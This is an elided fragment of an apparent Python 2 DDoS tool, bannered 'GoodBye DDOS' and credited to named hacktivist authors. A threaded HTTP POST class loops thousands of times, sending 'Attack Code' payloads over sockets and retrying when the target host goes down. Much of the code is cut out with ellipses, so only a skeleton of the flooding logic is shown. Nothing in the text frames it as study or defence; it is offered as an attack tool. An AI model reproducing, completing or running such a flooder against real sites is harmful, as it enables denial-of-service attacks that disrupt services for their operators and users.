...
class httpPost(Thread):
    ...
    def _send_http_post(self, pause=10):
        ...
        for i in range(0, 9999):
            ...
            print term.BOL+term.UP+term.CLEAR_EOL+"Attack Code: %s" % p+term.NORMAL
            self.socks.send(p)
            ...
            while self.running:
                try:
                    ...
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connection Host Off..."+ term.NORMAL
                    time.sleep(1)
                    continue
...
if __name__ == "__main__":
    print "\n/*"
    print " *"+term.RED +"--GoodBye DDOS--"+term.NORMAL
    print " * Author : Laura-Cyber & XOIX19"
    print " * Github : github.com/xoix19 & github.com/Laura-Cyber23"
    print " * GoodBye DDOS Hass Started"
    print " * Indonesian Cyber19"
    print " * We are Legion."
    print " */\n"
